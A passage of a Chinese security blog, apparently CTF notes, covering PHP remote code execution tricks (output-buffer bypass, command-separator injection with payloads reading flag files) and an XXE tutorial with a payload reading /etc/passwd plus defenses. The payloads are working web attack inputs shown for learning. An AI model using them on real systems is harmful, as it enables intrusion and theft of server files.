<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>还可以用下面的这个函数实现同样功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="八-缓冲区劫持"><a href="#八-缓冲区劫持" class="headerlink" title="八. 缓冲区劫持"></a>八. 缓冲区劫持</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们利用函数与命令对目录与文件进行读取时，获得的内容会被输出到缓冲区，但并没有立即发送到浏览器。<br>而本段代码中<code>ob_get_contents()</code>​ 获取当前输出缓冲区的内容（如果有的话），然后通过 <code>ob_end_clean()</code>​ 清空缓冲区。这些代码意味着，如果 PHP 代码执行过程中有任何输出，它将被捕获到变量 <code>$s</code>​ 中。然后通过对<code>$s</code>​的正则匹配将输出全部替换为<code>?</code>​，使我们无法获得flag。</p>
<h2 id="8-1-提前送出缓冲区"><a href="#8-1-提前送出缓冲区" class="headerlink" title="8.1 提前送出缓冲区"></a>8.1 提前送出缓冲区</h2><p>​<code>ob_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，但它并不会改变缓冲区中的内容。<br>​<code>ob_end_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，并清空缓冲区的内容。<br>利用这两个函数，可以在执行后续缓冲区操作前提前把内容输出<br>(这里的&#x2F;flag.txt是在根目录下的文件)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));ob_flush();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));ob_flush();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_flush();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_end_flush();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);ob_flush();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="8-2-提前终止程序"><a href="#8-2-提前终止程序" class="headerlink" title="8.2 提前终止程序"></a>8.2 提前终止程序</h2><p>如果在脚本结束时（比如在 <code>exit()</code>​ <code>die()</code>​被调用时），输出缓冲区中还有未输出的内容，PHP 会自动刷新这些内容并将其输出到浏览器。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="built_in">exit</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));die();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="built_in">exit</span>();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);die();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);die();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="九-命令分隔符"><a href="#九-命令分隔符" class="headerlink" title="九. 命令分隔符"></a>九. 命令分隔符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释一下这个</p>
<ul>
<li><p>​<code>&gt;/dev/null 2&gt;&amp;1</code>​ 是一个 Linux Shell 重定向操作：</p>
<ul>
<li>​<code>&gt;/dev/null</code>​：将标准输出重定向到 <code>/dev/null</code>​，相当于丢弃输出。</li>
<li>​<code>2&gt;&amp;1</code>​：将标准错误（<code>2</code>​）重定向到标准输出（<code>1</code>​），也一起丢弃。</li>
</ul>
</li>
<li><p>这意味着任何命令的输出（包括结果与报错）都不会显示。</p>
</li>
</ul>
<h2 id="9-1-​-​-​-​-0a​命令分隔"><a href="#9-1-​-​-​-​-0a​命令分隔" class="headerlink" title="9.1 ;​,||​,&amp;​,&amp;&amp;​ %0a​命令分隔"></a>9.1 <code>;</code>​,<code>||</code>​,<code>&amp;</code>​,<code>&amp;&amp;</code>​ <code>%0a</code>​命令分隔</h2><p>先来看一下这几个字符的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; <span class="comment">//分号，前面的命令被执行，后面的命令和&gt;/dev/null 2&gt;&amp;1拼接被丢弃  </span></span><br><span class="line">| <span class="comment">//只执行后面那条命令  </span></span><br><span class="line">|| <span class="comment">//只执行前面那条命令  </span></span><br><span class="line">&amp; <span class="comment">//两条命令分别执行  </span></span><br><span class="line">&amp;&amp; <span class="comment">//仅当前一条命令成功执行后才执行下一条命令</span></span><br><span class="line">%<span class="number">0</span>a <span class="comment">//在URL编码中代表换行符，可以分隔或中断正常的指令</span></span><br></pre></td></tr></table></figure>

<p>于是构造以下Payloads。需要注意的是<code>&amp;</code>​ 在 <strong>URL</strong> 中是一个保留字符，其作用是分隔多个参数，因此不能直接用 <code>&amp;</code>​ 而必须用 <code>%26</code>​。此处仅示例最基础命令，其他命令同理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br><span class="line">?c=tac flag.php;ls</span><br><span class="line"></span><br><span class="line">?c=ls||</span><br><span class="line">?c=tac flag.php||  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span>%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">0</span>A</span><br><span class="line">?c=tac flag.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawcfx8y0006cg7ke1z9hmx0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/XXE（XML外部实体注入）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XXE（XML外部实体注入）"><a href="#XXE（XML外部实体注入）" class="headerlink" title="XXE（XML外部实体注入）"></a>XXE（XML外部实体注入）</h1><h2 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h2><blockquote>
<p><strong>XXE（XML外部实体注入）</strong> 是一种针对应用程序<strong>处理XML数据</strong>的方式的攻击。在这种攻击中，攻击者<strong>利用应用程序</strong>对<strong>XML输入</strong>的<strong>处理不当</strong>，<strong>引入或“注入”</strong> 恶意内容。这可能<strong>导致未授权的数据访问、服务拒绝攻击甚至执行远程代码</strong>。</p>
</blockquote>
<p><img src="/.com//75546efaeffc13568dbf8842e9ee9cff-20250422220641-6fmtypu.png" alt="75546efaeffc13568dbf8842e9ee9cff">​</p>
<h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><blockquote>
<p>&#x3D;&#x3D;XML（可扩展标记语言）&#x3D;&#x3D;是一种常用于Web应用程序的数据格式。XML文档可以&#x3D;&#x3D;定义实体&#x3D;&#x3D;，它们是存储文档中其他地方重复使用的数据的方式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。</p>
<p>XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。</p>
</blockquote>
<h2 id="XXE漏洞案例讲解"><a href="#XXE漏洞案例讲解" class="headerlink" title="XXE漏洞案例讲解"></a>XXE漏洞案例讲解</h2><h3 id="案例：读取服务器文件"><a href="#案例：读取服务器文件" class="headerlink" title="案例：读取服务器文件"></a>案例：读取服务器文件</h3><ul>
<li><strong>场景</strong>：一个Web应用程序允许用户上传XML文件来更新个人配置。</li>
<li><strong>攻击方法</strong>：攻击者创建一个XML文件，其中包含一个外部实体，该实体引用了服务器上的敏感文件（例如<code>/etc/passwd</code>​）。</li>
</ul>
<p><strong>XML示例</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>结果</strong>：当服务器处理此XML文件时，外部实体<code>xxe</code>​被解析，导致<code>/etc/passwd</code>​文件的内容被插入到XML文档中，并返回给攻击者。</p>
<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="d93dbb9792be3727da5e6a2d56d6f996">​</p>
<h5 id="漏洞利用影响"><a href="#漏洞利用影响" class="headerlink" title="漏洞利用影响"></a>漏洞利用影响</h5><ul>
<li>攻击者可以读取服务器上的任意文件，这可能导致敏感信息泄露。</li>
<li>在某些情况下，攻击者还可以利用XXE漏洞发起服务拒绝（DoS）攻击，甚至执行远程代码。</li>
</ul>
<h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><ul>
<li><strong>禁用外部实体</strong>：在解析XML时禁用外部实体的处理。</li>
<li><strong>限制XML解析器功能</strong>：配置XML解析器，以最小化处理不必要功能，例如禁用DTD（文档类型定义）。</li>
<li><strong>输入验证</strong>：对输入的XML数据进行严格的验证，确保没有恶意构造的内容。</li>
<li><strong>错误处理</strong>：确保错误处理机制不会泄露敏感信息。</li>
</ul>
<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="dc7b47612a2ffd945abc66ff52d915f7"></p>
<h4 id="XXE-的危害"><a href="#XXE-的危害" class="headerlink" title="XXE 的危害"></a>XXE 的危害</h4><ol>
<li><p><strong>敏感数据泄露</strong>：</p>
<ul>
<li>XXE攻击可以使攻击者读取服务器上的文件，包括配置文件、源代码、密码文件等，从而泄露敏感信息。</li>
</ul>
</li>
<li><p><strong>内部系统扫描</strong>：</p>
<ul>
<li>攻击者可以利用XXE攻击探测内部网络，识别内部服务和应用，从而为进一步的攻击提供信息。</li>
</ul>
</li>
</ol>
<ul>
<li><p><strong>服务器端请求伪造（SSRF）</strong> ：</p>
<ul>
<li>通过XXE攻击，攻击者可能能够迫使服务器与内部系统或外部服务器进行交互，可能导致数据泄露或其他安全问题。</li>
</ul>
</li>
<li><p><strong>执行远程代码和命令</strong>：</p>
<ul>
<li>在某些情况下，特别是当解析器支持强大的功能时，XXE攻击可以用于执行远程代码或系统命令，从而完全控制受影响的服务器。</li>
</ul>
</li>
<li><p><strong>拒绝服务攻击（DoS）</strong> ：</p>
<ul>
<li>XXE攻击可以用于发起拒绝服务攻击，例如通过指向大量消耗资源的外部实体或构造庞大的XML文档来耗尽服务器资源。</li>
</ul>
</li>
<li><p><strong>绕过防火墙</strong>：</p>
<ul>
<li>攻击者可以利用XXE漏洞绕过直接从外部网络访问内部网络资源的限制。</li>
</ul>
</li>
<li><p><strong>植入恶意内容</strong>：</p>
<ul>
<li>在某些情况下，XXE漏洞可以被用来植入恶意内容到系统中，影响数据的完整性。</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmawcfx8y0007cg7kebhc5ayo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/工具使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/121588890">工具总结</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="cmawcfx8z000acg7k1xil56e8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>